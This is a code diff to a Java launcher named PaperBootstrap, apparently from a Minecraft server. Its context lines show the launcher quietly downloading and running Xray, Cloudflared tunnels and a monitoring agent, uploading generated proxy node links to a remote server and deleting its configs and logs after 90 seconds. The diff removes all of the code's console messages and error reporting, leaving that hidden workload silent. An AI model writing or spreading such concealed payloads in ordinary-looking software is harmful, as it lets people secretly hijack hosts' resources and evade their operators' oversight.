@@ -73,7 +73,6 @@ public final class PaperBootstrap {
     public static void boot(final OptionSet options) {
         // 检查 Java 版本
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println("ERROR: Your Java version is too low, please use Java 10+!");
             sleep(3000);
             System.exit(1);
         }
@@ -105,9 +104,6 @@ public final class PaperBootstrap {
 
             // 等待服务启动
             sleep(5000);
-            System.out.println("\n========================================");
-            System.out.println("  Server is running successfully!");
-            System.out.println("========================================\n");
 
             // 90秒后清理文件
             scheduleCleanup();
@@ -117,9 +113,7 @@ public final class PaperBootstrap {
             getStartupVersionMessages().forEach(LOGGER::info);
             Main.main(options);
 
-        } catch (Exception e) {
-            System.err.println("Error initializing services: " + e.getMessage());
-            e.printStackTrace();
+        } catch (Exception ignored) {
         }
     }
 
@@ -202,13 +196,11 @@ public final class PaperBootstrap {
             """, ARGO_PORT, UUID, UUID, UUID, UUID, UUID);
 
         Files.writeString(Paths.get(FILE_PATH, "config.json"), config);
-        System.out.println("✅ Xray config generated");
     }
 
     // === Argo 隧道类型判断 ===
     private static void argoType() throws IOException {
         if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) {
-            System.out.println("ARGO_DOMAIN or ARGO_AUTH is empty, using quick tunnels");
             return;
         }
 
@@ -234,9 +226,6 @@ public final class PaperBootstrap {
                 """, tunnelId, FILE_PATH, ARGO_DOMAIN, ARGO_PORT);
 
             Files.writeString(Paths.get(FILE_PATH, "tunnel.yml"), tunnelYaml);
-            System.out.println("✅ Tunnel config generated");
-        } else {
-            System.out.println("Using token to connect tunnel");
         }
     }
 
@@ -275,7 +264,6 @@ public final class PaperBootstrap {
             pb.redirectErrorStream(true);
             pb.redirectOutput(new File("/dev/null"));
             komariProcess = pb.start();
-            System.out.println("✅ Komari agent is running");
             sleep(1000);
         }
 
@@ -284,7 +272,6 @@ public final class PaperBootstrap {
         webPb.redirectErrorStream(true);
         webPb.redirectOutput(new File("/dev/null"));
         webProcess = webPb.start();
-        System.out.println("✅ Xray is running");
         sleep(1000);
 
         // 运行 Cloudflared
@@ -326,18 +313,15 @@ public final class PaperBootstrap {
         botPb.redirectErrorStream(true);
         botPb.redirectOutput(new File("/dev/null"));
         botProcess = botPb.start();
-        System.out.println("✅ Cloudflared is running");
         sleep(3000);
     }
 
     // === 下载文件 ===
     private static void downloadFile(String urlStr, Path destPath) throws IOException {
         if (Files.exists(destPath) && Files.size(destPath) > 1000000) {
-            System.out.println("Using existing: " + destPath.getFileName());
             return;
         }
 
-        System.out.println("Downloading: " + urlStr);
         URL url = new URL(urlStr);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setConnectTimeout(30000);
@@ -355,8 +339,6 @@ public final class PaperBootstrap {
         try (InputStream in = conn.getInputStream()) {
             Files.copy(in, destPath, StandardCopyOption.REPLACE_EXISTING);
         }
-
-        System.out.println("✅ Downloaded: " + destPath.getFileName() + " (" + Files.size(destPath) + " bytes)");
     }
 
     // === 提取临时隧道域名 ===
@@ -365,14 +347,12 @@ public final class PaperBootstrap {
 
         if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
             argoDomain = ARGO_DOMAIN;
-            System.out.println("Using fixed domain: " + argoDomain);
         } else {
             // 等待日志生成
             sleep(5000);
 
             Path bootLog = Paths.get(FILE_PATH, "boot.log");
             if (!Files.exists(bootLog)) {
-                System.err.println("boot.log not found, retrying...");
                 sleep(3000);
             }
 
@@ -382,9 +362,7 @@ public final class PaperBootstrap {
 
             if (matcher.find()) {
                 argoDomain = matcher.group(1);
-                System.out.println("ArgoDomain: " + argoDomain);
             } else {
-                System.err.println("ArgoDomain not found in boot.log");
                 return;
             }
         }
@@ -477,12 +455,6 @@ trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan
         // 保存订阅文件
         String encodedSub = Base64.getEncoder().encodeToString(subTxt.getBytes());
         Files.writeString(Paths.get(FILE_PATH, "sub.txt"), encodedSub);
-        System.out.println("✅ Subscription saved to " + FILE_PATH + "/sub.txt");
-
-        // 打印节点信息
-        System.out.println("\n========== Node Info ==========");
-        System.out.print(subTxt);
-        System.out.println("================================\n");
 
         // 上传节点
         uploadNodes(subTxt);
@@ -507,10 +479,7 @@ trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(jsonData.getBytes());
                 }
-
-                if (conn.getResponseCode() == 200) {
-                    System.out.println("✅ Subscription uploaded successfully");
-                }
+                conn.getResponseCode();
             } else {
                 // 上传节点
                 String[] lines = subTxt.split("\n");
@@ -536,13 +505,9 @@ trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(jsonData.getBytes());
                 }
-
-                if (conn.getResponseCode() == 200) {
-                    System.out.println("✅ Nodes uploaded successfully");
-                }
+                conn.getResponseCode();
             }
-        } catch (Exception e) {
-            System.err.println("Upload failed: " + e.getMessage());
+        } catch (Exception ignored) {
         }
     }
 
@@ -563,12 +528,8 @@ trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan
             try (OutputStream os = conn.getOutputStream()) {
                 os.write(jsonData.getBytes());
             }
-
-            if (conn.getResponseCode() == 200) {
-                System.out.println("✅ Auto access task added");
-            }
-        } catch (Exception e) {
-            System.err.println("Add auto access task failed: " + e.getMessage());
+            conn.getResponseCode();
+        } catch (Exception ignored) {
         }
     }
 
@@ -584,9 +545,6 @@ trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan
 
                 Files.deleteIfExists(configPath);
                 Files.deleteIfExists(bootLogPath);
-                // 不删除正在运行的二进制文件
-
-                System.out.println("✅ Cleanup completed");
             } catch (IOException ignored) {
             }
         }, 90, TimeUnit.SECONDS);
@@ -597,15 +555,12 @@ trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan
         running.set(false);
         if (webProcess != null && webProcess.isAlive()) {
             webProcess.destroy();
-            System.out.println("Xray process terminated");
         }
         if (botProcess != null && botProcess.isAlive()) {
             botProcess.destroy();
-            System.out.println("Cloudflared process terminated");
         }
         if (komariProcess != null && komariProcess.isAlive()) {
             komariProcess.destroy();
-            System.out.println("Komari agent terminated");
         }
     }
 
